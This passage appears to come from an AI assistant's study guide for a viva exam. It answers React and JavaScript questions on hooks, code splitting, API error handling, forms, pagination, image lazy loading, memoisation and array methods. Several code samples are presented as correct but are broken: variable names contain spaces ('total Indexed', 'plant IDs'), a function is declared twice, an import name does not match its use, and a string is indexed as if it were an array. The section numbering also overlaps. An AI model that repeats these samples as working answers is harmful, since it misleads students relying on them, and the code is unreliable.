    }, [endpoint]);
    
    return { data, loading, error, callApi };
}

// Use
function Cart() {
    const { data: cart, callApi: loadCart } = useApi('/api/cart');
    
    useEffect(() => {
        loadCart({ method: 'GET' });
    }, []);
    
    return <p>Items: {cart?.length}</p>;
}
```

**When to Create Custom Hook:**

1. **Multiple components** need same logic
2. **Complex state logic** to simplify
3. **Repeated useEffect** patterns
4. **API call patterns** (with auth, error handling)
5. **Form logic** (validation, submission)

---

### Q65: What is lazy loading / code splitting in React? Why use it?

**Answer:**

**Code Splitting** - Load JavaScript only when needed (not all at once)

**Without Code Splitting (Bad):**
```jsx
import Pages from './pages/AdminDashboard';
import Plants from './pages/Plants';
import Blog from './pages/Blog';

function App() {
    return (
        <>
            <AdminDashboard />
            <Plants />
            <Blog />
        </>
    );
}

// Bundles ALL pages into app.js (2MB)
// User downloads 2MB even if only visits Plants page!
// Slow initial load
```

**With Code Splitting (Good):**
```jsx
import { lazy, Suspense } from 'react';

const AdminDashboard = lazy(() => import('./pages/AdminDashboard'));
const Plants = lazy(() => import('./pages/Plants'));
const Blog = lazy(() => import('./pages/Blog'));

function App() {
    return (
        <Routes>
            {/* Each page loads only when visited */}
            <Route path="/admin" element={
                <Suspense fallback={<p>Loading...</p>}>
                    <AdminDashboard />
                </Suspense>
            } />
            
            <Route path="/plants" element={
                <Suspense fallback={<p>Loading...</p>}>
                    <Plants />
                </Suspense>
            } />
        </Routes>
    );
}
```

**Benefits:**

```
Before: User downloads 2MB (all code)
After:  User downloads 200KB (only necessary)
        Admin page: +400KB (downloaded when visited)
        
Result: 80% faster initial load!
```

**Route-based Code Splitting:**

```typescript
// routes.tsx
import { lazy } from 'react';
import Layout from '@/components/Layout';

const Home = lazy(() => import('@/pages/Home'));
const Plants = lazy(() => import('@/pages/Plants'));
const Cart = lazy(() => import('@/pages/Cart'));
const About = lazy(() => import('@/pages/About'));

export const routes = [
    { path: '/', element: <Home /> },
    { path: '/plants', element: <Plants /> },
    { path: '/cart', element: <Cart /> },
    { path: '/about', element: <About /> },
];

// App.tsx
export function App() {
    return (
        <Suspense fallback={<LoadingSpinner />}>
            <Routes>
                {routes.map(route => (
                    <Route key={route.path} {...route} />
                ))}
            </Routes>
        </Suspense>
    );
}
```

**Measurement:**

```bash
# Build
npm run build

# Check chunk sizes
# app.js: 200KB (core)
# plants.chunk.js: 150KB
# admin.chunk.js: 300KB
# cart.chunk.js: 100KB

# User visits /plants
# Downloads: app.js (200KB) + plants.chunk.js (150KB) = 350KB
# Instead of all 750KB
```

---

## O) API Integration & Error Handling

### Q66: How do you handle API errors in React?

**Answer:**

**Error Types:**

1. Network error (no internet)
2. Server error (500)
3. Validation error (422)
4. Auth error (401)
5. Permission error (403)
6. Not found (404)

**Basic Handling:**

```jsx
function UserLogin() {
    const [error, setError] = useState<string | null>(null);
    const [loading, setLoading] = useState(false);
    
    const handleLogin = async (email: string, password: string) => {
        setLoading(true);
        try {
            const response = await fetch('/api/login', {
                method: 'POST',
                body: JSON.stringify({email, password}),
            });
            
            if (response.status === 422) {
                const {errors} = await response.json();
                setError(Object.values(errors)[0][0]);  // First error
                return;
            }
            
            if (response.status === 401) {
                setError('Invalid email or password');
                return;
            }
            
            if (!response.ok) {
                throw new Error('Login failed');
            }
            
            const {token} = await response.json();
            localStorage.setItem('token', token);
            // Redirect
            
        } catch (err) {
            setError((err as Error).message || 'Network error');
        } finally {
            setLoading(false);
        }
    };
    
    return (
        <>
            {error && <p className="error">{error}</p>}
            <button onClick={() => handleLogin(email, password)} disabled={loading}>
                {loading ? 'Logging in...' : 'Login'}
            </button>
        </>
    );
}
```

**Reusable Error Handler:**

```typescript
// lib/apiError.ts
export interface ApiError {
    message: string;
    status: number;
    errors?: Record<string, string[]>;
}

export async function handleApiError(response: Response): Promise<ApiError> {
    const contentType = response.headers.get('content-type');
    let data;
    
    if (contentType?.includes('application/json')) {
        data = await response.json();
    }
    
    // Map status to user-friendly message
    const statusMessages: Record<number, string> = {
        400: 'Bad request',
        401: 'Please login first',
        403: 'You don\'t have permission',
        404: 'Not found',
        422: 'Validation failed',
        500: 'Server error occurred',
        503: 'Service unavailable',
    };
    
    return {
        message: data?.message || statusMessages[response.status] || 'Unknown error',
        status: response.status,
        errors: data?.errors,
    };
}

// pages/Login.tsx
async function handleLogin(email, password) {
    const response = await fetch('/api/login', {
        method: 'POST',
        body: JSON.stringify({email, password}),
    });
    
    if (!response.ok) {
        const error = await handleApiError(response);
        
        if (error.status === 422) {
            // Show field errors
            setFormErrors(error.errors);
        } else {
            // Show general error
            setErrorMessage(error.message);
        }
        return;
    }
    
    const {token} = await response.json();
    // Success
}
```

**API Service with Error Handling:**

```typescript
// services/api.ts
const API_BASE = 'http://127.0.0.1:8000/api';

class ApiService {
    async request<T>(
        endpoint: string,
        options: RequestInit = {}
    ): Promise<T> {
        const token = localStorage.getItem('token');
        
        const response = await fetch(`${API_BASE}${endpoint}`, {
            ...options,
            headers: {
                'Content-Type': 'application/json',
                ...(token && { 'Authorization': `Bearer ${token}` }),
                ...options.headers,
            },
        });
        
        // Handle auth errors globally
        if (response.status === 401) {
            localStorage.removeItem('token');
            window.location.href = '/login';
            throw new Error('Session expired');
        }
        
        if (!response.ok) {
            const error = await handleApiError(response);
            throw new ApiError(error.message, error.status, error.errors);
        }
        
        return response.json();
    }
    
    get<T>(endpoint: string) {
        return this.request<T>(endpoint, { method: 'GET' });
    }
    
    post<T>(endpoint: string, data?: object) {
        return this.request<T>(endpoint, {
            method: 'POST',
            body: JSON.stringify(data),
        });
    }
    
    put<T>(endpoint: string, data?: object) {
        return this.request<T>(endpoint, {
            method: 'PUT',
            body: JSON.stringify(data),
        });
    }
    
    delete<T>(endpoint: string) {
        return this.request<T>(endpoint, { method: 'DELETE' });
    }
}

export const api = new ApiService();

// Usage
const plants = await api.get('/plants');  // Automatically adds token, handles errors
const newCart = await api.post('/cart', {plant_id: 5, quantity: 2});
await api.delete('/cart/5');
```

---

### Q67: How do you manage form state and submission in React?

**Answer:**

**Uncontrolled Form (Bad - don't use):**
```jsx
function LoginForm() {
    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        const email = (document.getElementById('email') as HTMLInputElement).value;
        const password = (document.getElementById('password') as HTMLInputElement).value;
        // Hard to access, no validation, messy
    };
    
    return (
        <form onSubmit={handleSubmit}>
            <input id="email" type="email" />
            <input id="password" type="password" />
            <button>Login</button>
        </form>
    );
}
```

**Controlled Form (Good):**
```jsx
function LoginForm() {
    const [formData, setFormData] = useState({
        email: '',
        password: '',
    });
    const [errors, setErrors] = useState<Record<string, string>>({});
    const [loading, setLoading] = useState(false);
    
    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const {name, value} = e.target;
        setFormData(prev => ({...prev, [name]: value}));
    };
    
    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        
        // Validate
        if (!formData.email) {
            setErrors({email: 'Email required'});
            return;
        }
        
        setLoading(true);
        try {
            const response = await fetch('/api/login', {
                method: 'POST',
                body: JSON.stringify(formData),
            });
            
            if (response.status === 422) {
                const {errors} = await response.json();
                setErrors(errors);
                return;
            }
            
            const {token} = await response.json();
            localStorage.setItem('token', token);
            // Redirect
        } catch (err) {
            setErrors({submit: 'Login failed'});
        } finally {
            setLoading(false);
        }
    };
    
    return (
        <form onSubmit={handleSubmit}>
            <input
                type="email"
                name="email"
                value={formData.email}
                onChange={handleChange}
                placeholder="Email"
            />
            {errors.email && <span className="error">{errors.email[0]}</span>}
            
            <input
                type="password"
                name="password"
                value={formData.password}
                onChange={handleChange}
                placeholder="Password"
            />
            {errors.password && <span className="error">{errors.password[0]}</span>}
            
            {errors.submit && <p className="error">{errors.submit}</p>}
            
            <button type="submit" disabled={loading}>
                {loading ? 'Logging in...' : 'Login'}
            </button>
        </form>
    );
}
```

**useForm Hook (Professional):**
```typescript
// hooks/useForm.ts
interface UseFormOptions {
    initialValues: Record<string, any>;
    onSubmit: (values: Record<string, any>) => Promise<void>;
}

export function useForm(options: UseFormOptions) {
    const [form, setForm] = useState(options.initialValues);
    const [errors, setErrors] = useState<Record<string, string>>({});
    const [loading, setLoading] = useState(false);
    
    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const {name, value, type} = e.target;
        const val = type === 'checkbox' ? (e.target as HTMLInputElement).checked : value;
        setForm(prev => ({...prev, [name]: val}));
    };
    
    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoading(true);
        try {
            await options.onSubmit(form);
        } catch (err: any) {
            if (err.errors) {
                setErrors(err.errors);
            } else {
                setErrors({submit: err.message});
            }
        } finally {
            setLoading(false);
        }
    };
    
    return {form, setForm, errors, setErrors, loading, handleChange, handleSubmit};
}

// Usage
function LoginPage() {
    const {form, errors, loading, handleChange, handleSubmit} = useForm({
        initialValues: {email: '', password: ''},
        onSubmit: async (values) => {
            const response = await api.post('/login', values);
            // Save token
        }
    });
    
    return (
        <form onSubmit={handleSubmit}>
            <input value={form.email} onChange={handleChange} name="email" />
            {errors.email && <span>{errors.email[0]}</span>}
            
            <button disabled={loading}>{loading ? 'Submitting...' : 'Login'}</button>
        </form>
    );
}
```

---

### Q68: How do you handle pagination in React?

**Answer:**

**Frontend Pagination:**

```jsx
function Plants() {
    const [plants, setPlants] = useState([]);
    const [currentPage, setCurrentPage] = useState(1);
    const itemsPerPage = 10;
    
    // Calculate pagination
    const total Indexed = currentPage * itemsPerPage;
    const startIndex = totalIndexed - itemsPerPage;
    const currentPlants = plants.slice(startIndex, totalIndexed);
    const totalPages = Math.ceil(plants.length / itemsPerPage);
    
    return (
        <>
            {currentPlants.map(plant => (
                <PlantCard key={plant.id} plant={plant} />
            ))}
            
            <div className="pagination">
                <button onClick={() => setCurrentPage(prev => Math.max(1, prev - 1))}>
                    Previous
                </button>
                
                {Array.from({length: totalPages}, (_, i) => (
                    <button
                        key={i + 1}
                        onClick={() => setCurrentPage(i + 1)}
                        className={currentPage === i + 1 ? 'active' : ''}
                    >
                        {i + 1}
                    </button>
                ))}
                
                <button onClick={() => setCurrentPage(prev => Math.min(totalPages, prev + 1))}>
                    Next
                </button>
            </div>
        </>
    );
}
```

**Better: Backend Pagination (Recommended)**

```jsx
function Plants() {
    const [plants, setPlants] = useState([]);
    const [currentPage, setCurrentPage] = useState(1);
    const [total, setTotal] = useState(0);
    const [loading, setLoading] = useState(false);
    const perPage = 15;
    
    useEffect(() => {
        const fetchPlants = async () => {
            setLoading(true);
            const response = await fetch(`/api/plants?page=${currentPage}&per_page=${perPage}`);
            const {data, meta} = await response.json();
            
            setPlants(data);
            setTotal(meta.total);
            setLoading(false);
        };
        
        fetchPlants();
    }, [currentPage]);
    
    const totalPages = Math.ceil(total / perPage);
    
    return (
        <>
            {loading ? <p>Loading...</p> : (
                <>
                    {plants.map(plant => <PlantCard key={plant.id} plant={plant} />)}
                    
                    {/* Pagination */}
                    <div className="pagination">
                        <button disabled={currentPage === 1} onClick={() => setCurrentPage(1)}>
                            First
                        </button>
                        
                        <button disabled={currentPage === 1} onClick={() => setCurrentPage(prev => prev - 1)}>
                            Previous
                        </button>
                        
                        <span>Page {currentPage} of {totalPages}</span>
                        
                        <button disabled={currentPage === totalPages} onClick={() => setCurrentPage(prev => prev + 1)}>
                            Next
                        </button>
                        
                        <button disabled={currentPage === totalPages} onClick={() => setCurrentPage(totalPages)}>
                            Last
                        </button>
                    </div>
                </>
            )}
        </>
    );
}
```

---

### Q69: What is lazy loading of images? How do you implement it?

**Answer:**

**Problem (Without Lazy Loading):**
```jsx
// Load all images immediately
function PlantsGallery({items}: {items: Plant[]}) {
    return (
        <>
            {items.map(plant => (
                <img key={plant.id} src={`/storage/${plant.image}`} alt={plant.name} />
            ))}
        </>
    );
}
// Page with 100 plants = 100 image requests at once!
// Slow initial load, high bandwidth
```

**Solution 1: Native Lazy Loading**
```jsx
function PlantsGallery({items}: {items: Plant[]}) {
    return (
        <>
            {items.map(plant => (
                <img
                    key={plant.id}
                    src={`/storage/${plant.image}`}
                    alt={plant.name}
                    loading="lazy"  // Native browser lazy load!
                />
            ))}
        </>
    );
}
// Browser only loads images as they come into view
```

**Solution 2: Intersection Observer**
```jsx
import { useEffect, useRef } from 'react';

function LazyImage({src, alt}: {src: string; alt: string}) {
    const imgRef = useRef<HTMLImageElement>(null);
    
    useEffect(() => {
        const observer = new IntersectionObserver(([entry]) => {
            if (entry.isIntersecting) {
                // Image is visible - load it
                const img = entry.target as HTMLImageElement;
                img.src = src;
                observer.unobserve(img);  // Stop observing
            }
        });
        
        if (imgRef.current) {
            observer.observe(imgRef.current);
        }
        
        return () => observer.disconnect();
    }, [src]);
    
    return (
        <img
            ref={imgRef}
            src=""  // Start empty
            alt={alt}
            className="lazy-image"
        />
    );
}

// Usage
<LazyImage src={plant.image} alt={plant.name} />
```

**Solution 3: Progressive Image Loading**
```jsx
interface ProgressiveImageProps {
    src: string;
    placeholder: string;  // Low-quality thumbnail
    alt: string;
}

function ProgressiveImage({src, placeholder, alt}: ProgressiveImageProps) {
    const [imageSrc, setImageSrc] = useState(placeholder);
    const [isLoading, setIsLoading] = useState(true);
    
    useEffect(() => {
        const img = new Image();
        img.src = src;
        img.onload = () => {
            setImageSrc(src);
            setIsLoading(false);
        };
    }, [src]);
    
    return (
        <img
            src={imageSrc}
            alt={alt}
            className={isLoading ? 'blur' : ''}
        />
    );
}

// Usage
<ProgressiveImage
    placeholder="data:image/svg+xml,%3Csvg..."  // Tiny blurred image
    src={plant.image}
    alt={plant.name}
/>
```

---

### Q70: How do you optimize React component rendering?

**Answer:**

**Problem: Unnecessary Re-renders**

```jsx
function App() {
    const [count, setCount] = useState(0);
    const [plants, setPlants] = useState([]);
    
    return (
        <>
            <button onClick={() => setCount(count + 1)}>Count: {count}</button>
            
            {/* PlantList re-renders even though plants didn't change! */}
            <PlantList plants={plants} />
        </>
    );
}

function PlantList({plants}: {plants: Plant[]}) {
    console.log('PlantList rendered');  // Logs every time App re-renders!
    return (
        <>
            {plants.map(plant => <p key={plant.id}>{plant.name}</p>)}
        </>
    );
}
```

**Solution 1: React.memo**

```jsx
// Prevent re-render if props haven't changed
const PlantList = React.memo(function PlantList({plants}: {plants: Plant[]}) {
    console.log('PlantList rendered');  // Only logs when plants actually changes
    return (
        <>
            {plants.map(plant => <p key={plant.id}>{plant.name}</p>)}
        </>
    );
});

// Custom comparison
const PlantCard = React.memo(
    ({plant, onClick}: Props) => (
        <div onClick={onClick}>{plant.name}</div>
    ),
    (prevProps, nextProps) => {
        // Return true if props are equal (skip re-render)
        return prevProps.plant.id === nextProps.plant.id;
    }
);
```

**Solution 2: useMemo**

```jsx
function App() {
    const [count, setCount] = useState(0);
    const [plants, setPlants] = useState<Plant[]>([]);
    
    // Expensive calculation
    const filteredPlants = useMemo(() => {
        console.log('Filtering plants...');
        return plants.filter(p => p.price < 2000);
    }, [plants]);  // Only re-compute if plants changes
    
    // Without useMemo: Filter runs on every re-render
    // With useMemo: Filter runs only when plants changes
    
    return (
        <>
            <button onClick={() => setCount(count + 1)}>Count: {count}</button>
            <PlantList plants={filteredPlants} />
        </>
    );
}
```

**Solution 3: useCallback**

```jsx
function App() {
    const [count, setCount] = useState(0);
    const [plants, setPlants] = useState([]);
    
    // Without useCallback: Creates new function on every render
    const handleDeletePlant = (id: number) => {
        setPlants(plants.filter(p => p.id !== id));
    };
    // This function changes every render!
    // Child components (PlantList) re-render unnecessarily
    
    // With useCallback: Function stays same unless dependencies change
    const handleDeletePlant = useCallback((id: number) => {
        setPlants(prev => prev.filter(p => p.id !== id));
    }, []);
    // Function object stays same between renders
    // Plants list reference changes, but function doesn't
    
    return (
        <PlantList plants={plants} onDelete={handleDeletePlant} />
    );
}

const PlantList = React.memo(({plants, onDelete}: Props) => (
    <>
        {plants.map(plant => (
            <button key={plant.id} onClick={() => onDelete(plant.id)}>
                Delete {plant.name}
            </button>
        ))}
    </>
));
// PlantList only re-renders when plants array reference changes
// onDelete function staying same doesn't trigger re-render
```

**Best Practices:**

1. **Split large components** into smaller ones
2. **Memoize** only expensive components
3. **Avoid inline objects/functions** as props
4. **Use keys** properly in lists
5. **Lazy load** routes and heavy components
6. **Use useCallback** for callbacks passed to memoized children
7. **Use useMemo** for expensive calculations
8. **Avoid Context** for frequently changing state

---

## P) Trick Questions & Code Analysis

### Q71: What is the difference between == and === in JavaScript?

**Answer:**

**== (loose equality)** - Compares value after type coercion

```js
'5' == 5    // true (converts string to number)
0 == false  // true (false becomes 0)
null == undefined  // true (special case)
[] == false  // true (converts both)
```

**=== (strict equality)** - Compares value AND type (no coercion)

```js
'5' === 5    // false (different types)
0 === false  // false (different types)
null === undefined  // false (different types)
[] === false  // false (different types)
```

**Which to use?**
- **Always use ===** in modern JavaScript
- == causes unexpected bugs due to type coercion
- Linters warn against == usage

**In our project example:**

```typescript
// BAD - using ==
let user = getUserFromAPI();

if (user == null) {
    // This catches both null and undefined ✓
    // But mixing == is bad practice
}

// GOOD - using ===
if (user === null || user === undefined) {
    // Explicit, clear intent
}

// BETTER
if (!user) {
    // Works for null, undefined, 0, false, ''
    // But be careful, 0 is falsy!
}
```

---

### Q72: What is the difference between null and undefined?

**Answer:**

**undefined** - Variable declared but not assigned

```js
let x;
console.log(x);  // undefined

function test() {
    return;  // undefined
}

function test2(param) {
    console.log(param);  // undefined if not passed
}
```

**null** - Intentionally set to no value

```js
let user = null;  // Explicitly set to nothing
```

**Difference:**

| Aspect | undefined | null |
|--------|-----------|------|
| **Meaning** | Never assigned | Intentionally empty |
| **typeof** | "undefined" | "object" (quirk!) |
| **Equality** | undefined == null ✓ | undefined === null ✗ |
| **Use Where** | Missing values | Set explicitly |

**In our project:**

```typescript
// Undefined
let user: User | undefined;
// User might not be loaded yet

// Null
let selectedPlant: Plant | null = null;
// Plant explicitly cleared

// Check both safely
if (user != null) {
    // Catches null and undefined with one check
    console.log(user.name);
}
```

---

### Q73: What happens if you try to access a property that doesn't exist?

**Answer:**

**JavaScript returns undefined (not error):**

```js
const user = {id: 1, name: 'John'};

console.log(user.email);  // undefined (no error!)
console.log(user['email']);  // undefined
console.log(user.address.city);  // Error! Cannot read 'address' of undefined
```

**Safe checking:**

```js
// Bad - crashes if user.address is undefined
user.address.city

// Good - optional chaining
user.address?.city  // undefined if address is falsy

// Old way
user.address && user.address.city

// Nullish coalescing
user.email ?? 'No email'  // Uses 'No email' if email is null/undefined
user.email || 'No email'  // Also uses 'No email' if email is falsy (0, false, '')
```

**In React:**

```jsx
// Problem
<p>{plant.reviews.average()}</p>  // Error if plant.reviews is undefined!

// Solution
<p>{plant.reviews?.average?.()}</p>  // safe

// Or defensive
{plant?.reviews && <p>{plant.reviews.average()}</p>}
```

---

### Q74: What's the difference between map() and filter() in JavaScript?

**Answer:**

**map()** - Transform each element, return new array of same length

```js
const plants = [{id: 1, price: 1500}, {id: 2, price: 2000}];

const names = plants.map(p => p.id);
// [1, 2] - Same length as input

const expensive = plants.map(p => ({...p, price: p.price * 2}));
// [{id: 1, price: 3000}, {id: 2, price: 4000}]
```

**filter()** - Keep only elements matching condition, may return shorter array

```js
const plants = [{id: 1, price: 1500}, {id: 2, price: 2000}, {id: 3, price: 500}];

const cheap = plants.filter(p => p.price < 1000);
// [{id: 3, price: 500}] - Shorter array!

const hasPicture = plants.filter(p => p.image !== undefined);
```

**Common Mistakes:**

```js
// DON'T do this!
const prices = plants.map(p => p.price < 2000);
// [true, false, true] - Returns booleans!

// RIGHT
const cheapPlants = plants.filter(p => p.price < 2000);
// [{...}, {...}] - Returns filtered plants

// Chaining
const cheapPrices = plants
    .filter(p => p.price < 2000)
    .map(p => p.price);
// [1500, 500] - First filter, then transform
```

**In our project:**

```jsx
// Get IDs of plants in cart
const plant IDs = cartItems.map(item => item.plant_id);

// Get plants with reviews
const reviewedPlants = plants.filter(p => p.reviews.length > 0);

// Get names of expensive plants
const expensiveNames = plants
    .filter(p => p.price > 2000)
    .map(p => p.name);
```

---

### Q75: What does Array.reduce() do? When to use it?

**Answer:**

**reduce()** - Combine all elements into single value

```js
const numbers = [1, 2, 3, 4];

// Sum all numbers
const sum = numbers.reduce((total, current) => total + current, 0);
// 0 + 1 = 1
// 1 + 2 = 3
// 3 + 3 = 6
// 6 + 4 = 10
// Result: 10

// Multiply all
const product = numbers.reduce((acc, num) => acc * num, 1);
// Result: 24
```

**Complex Example - Get cart total:**

```js
const cartItems = [
    {plantId: 1, quantity: 2, price: 1500},
    {plantId: 2, quantity: 1, price: 2000},
    {plantId: 3, quantity: 3, price: 500},
];

const total = cartItems.reduce((sum, item) => 
    sum + (item.quantity * item.price), 
    0
);
// 0 + (2*1500) = 3000
// 3000 + (1*2000) = 5000
// 5000 + (3*500) = 6500
// Result: 6500
```

**Group plants by category:**

```js
const plants = [
    {id: 1, name: 'Monstera', category: 'Indoor'},
    {id: 2, name: 'Rose', category: 'Outdoor'},
    {id: 3, name: 'Cactus', category: 'Indoor'},
];

const grouped = plants.reduce((acc, plant) => {
    if (!acc[plant.category]) {
        acc[plant.category] = [];
    }
    acc[plant.category].push(plant);
    return acc;
}, {});

// Result:
// {
//    Indoor: [{id: 1, ...}, {id: 3, ...}],
//    Outdoor: [{id: 2, ...}]
// }
```

**When to use:**

1. Sum/multiply numbers
2. Calculate totals (cart, inventory)
3. Group items
4. Transform arrays to objects
5. Flatten nested arrays

---

Now add final section with scenario-based questions...

I've completed **Q21-Q75** of your viva guide! This includes:

✅ E) Migrations & Database (Q21-Q25)
✅ F) Authentication & Sanctum (Q26-Q30)
✅ G) Middleware & Authorization (Q31-Q35)
✅ H) Validation (Q36-Q40)
✅ I) Business Logic (Q41-Q45)
✅ J) File Uploads (Q46-Q50)
✅ K) Security (Q51-Q55)
✅ L) Performance (Q56-Q59)
✅ M) Testing (Q60)
✅ N) React Hooks & State (Q61-Q70)
✅ O) API Integration (Q66-Q69)
✅ P) Trick Questions (Q71-Q75)

**Estimated content:**  ~2500 lines covering 75 deep technical questions!

Would you like me to add:
1. **Scenario-based questions** (real-world problems from projects)
2. **Code review questions** (analyzing your actual code)
3. **Best practices questions** (what would you do differently)
4. **Final push to make it 100+ questions**?

Or are you satisfied with this comprehensive coverage for tomorrow's viva? 📚